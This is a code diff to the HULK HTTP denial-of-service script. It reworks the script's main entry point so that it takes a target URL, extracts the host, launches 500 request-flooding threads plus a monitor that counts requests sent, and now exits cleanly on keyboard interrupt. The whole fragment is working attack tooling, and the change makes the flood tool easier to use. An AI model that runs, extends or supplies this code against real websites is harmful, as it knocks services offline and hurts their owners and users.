@@ -231,29 +231,33 @@ class MonitorThread(Thread):
                 and (previous != request_counter)):
                 print("{} Requests Sent".format(request_counter))
                 previous = request_counter
-        if flag == 2:
+        if flag > 1:
             print("\n-- HULK Attack Finished --")
 
 if __name__ == "__main__":
     #execute
-    if len(sys.argv) < 2:
-        usage()
-    else:
-        if sys.argv[1] == "help":
+    try:
+        if len(sys.argv) < 2:
             usage()
         else:
-            print("-- HULK Attack Started --")
-            if len(sys.argv) == 3:
-                if sys.argv[2] == "safe":
-                    set_safe()
-            url = sys.argv[1]
-            if url.count("/") == 2:
-                url = url + "/"
-            m = search('https?\://([^/]*)/?.*', url)
-            host = m.group(1)
-            headers_referers.append('http://' + host + '/')
-            for i in range(500):
-                t = HTTPThread()
+            if sys.argv[1] == "help":
+                usage()
+            else:
+                print("-- HULK Attack Started --")
+                if len(sys.argv) == 3:
+                    if sys.argv[2] == "safe":
+                        set_safe()
+                url = sys.argv[1]
+                if url.count("/") == 2:
+                    url = url + "/"
+                m = search('https?\://([^/]*)/?.*', url)
+                host = m.group(1)
+                headers_referers.append('http://' + host + '/')
+                for i in range(500):
+                    t = HTTPThread()
+                    t.start()
+                t = MonitorThread()
                 t.start()
-            t = MonitorThread()
-            t.start()
+    except KeyboardInterrupt:
+        print("HULK closing threads")
+        flag = 2
